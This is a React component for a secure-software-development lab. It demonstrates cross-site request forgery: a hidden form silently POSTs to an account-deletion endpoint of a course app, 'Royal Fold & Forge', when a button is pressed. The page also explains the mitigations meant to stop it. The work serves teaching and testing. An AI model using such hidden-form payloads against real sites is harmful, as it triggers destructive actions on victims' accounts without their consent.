"use client";

import React, { useEffect, useState } from 'react';

export default function CSRFDemo() {
  const [status, setStatus] = useState("Ready to trigger attack...");
  const [log, setLog] = useState([]);

  const addLog = (msg) => setLog(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);

  const triggerAttack = () => {
    setStatus("Triggering attack...");
    addLog("Form submission initiated.");
    
    // The actual PoC provided by the user
    const form = document.getElementById('csrf-trigger');
    if (form) {
      addLog("Found form #csrf-trigger. Submitting...");
      form.submit();
      setStatus("Attack triggered! Redirecting...");
    } else {
      addLog("Error: form #csrf-trigger not found.");
      setStatus("Error: form not found.");
    }
  };

  return (
    <div style={{ padding: '40px', fontFamily: 'system-ui, sans-serif', maxWidth: '800px', margin: '0 auto', color: '#333' }}>
      <header style={{ borderBottom: '2px solid #ff4d4d', paddingBottom: '20px', marginBottom: '30px' }}>
        <h1 style={{ color: '#ff4d4d', margin: 0 }}>CSRF Proof of Concept (Educational)</h1>
        <p style={{ color: '#666', fontSize: '1.1rem' }}>SSD Lab: Demonstrating Cross-Site Request Forgery</p>
      </header>

      <section style={{ backgroundColor: '#fff5f5', border: '1px solid #ffcccc', borderRadius: '8px', padding: '20px', marginBottom: '30px' }}>
        <h2 style={{ color: '#d32f2f', marginTop: 0 }}>Description</h2>
        <p>
          This page simulates a malicious website that attempts to perform a state-changing action (deleting an account)
          on behalf of an authenticated user of the <strong>Royal Fold & Forge</strong> application.
        </p>
        <p>
          <strong>Target Endpoint:</strong> <code>POST /api/deleteAccount</code>
        </p>

        <div style={{ padding: '15px', backgroundColor: '#fff', borderRadius: '4px', border: '1px solid #ddd' }}>
          <h3>Vulnerability Analysis</h3>
          <ul style={{ lineHeight: '1.6' }}>
            <li><strong>Expected Behavior (Mitigated):</strong> The request should fail because the authentication cookie (<code>token</code>) is marked <code>SameSite=Strict</code>, and the server expects a <code>application/json</code> payload, which standard HTML forms cannot send.</li>
            <li><strong>Exploitation Goal:</strong> Prove that without these mitigations, a silent form submission could trigger sensitive actions.</li>
          </ul>
        </div>
      </section>

      <div style={{ textAlign: 'center', marginBottom: '30px' }}>
        <button 
          onClick={triggerAttack}
          style={{
            backgroundColor: '#ff4d4d',
            color: 'white',
            padding: '12px 24px',
            fontSize: '18px',
            border: 'none',
            borderRadius: '6px',
            cursor: 'pointer',
            fontWeight: 'bold',
            transition: 'background-color 0.2s'
          }}
          onMouseOver={(e) => e.target.style.backgroundColor = '#e60000'}
          onMouseOut={(e) => e.target.style.backgroundColor = '#ff4d4d'}
        >
          🚀 Trigger CSRF Attack
        </button>
        <p style={{ marginTop: '10px', color: '#d32f2f', fontWeight: '500' }}>{status}</p>
      </div>

      {/* The Hidden Form - The Core of the PoC */}
      <div style={{ display: 'none' }}>
        <form id="csrf-trigger" action="/api/deleteAccount" method="POST">
          <input type="hidden" name="userid" value="target_id" />
        </form>
      </div>

      <section style={{ backgroundColor: '#f8f9fa', borderRadius: '8px', padding: '20px', border: '1px solid #dee2e6' }}>
        <h2 style={{ color: '#495057', marginTop: 0 }}>Execution Log</h2>
        <div style={{ 
          backgroundColor: '#212529', 
          color: '#00ff00', 
          padding: '15px', 
          borderRadius: '4px', 
          fontFamily: 'monospace',
          minHeight: '100px',
          overflowY: 'auto'
        }}>
          {log.length === 0 ? "Waiting for interaction..." : log.map((entry, index) => (
            <div key={index}>{entry}</div>
          ))}
        </div>
      </section>

      <footer style={{ marginTop: '50px', borderTop: '1px solid #eee', paddingTop: '20px', textAlign: 'center', color: '#888', fontSize: '0.9rem' }}>
        <p>Secure Software Development - Vulnerability Demonstration</p>
      </footer>
    </div>
  );
}
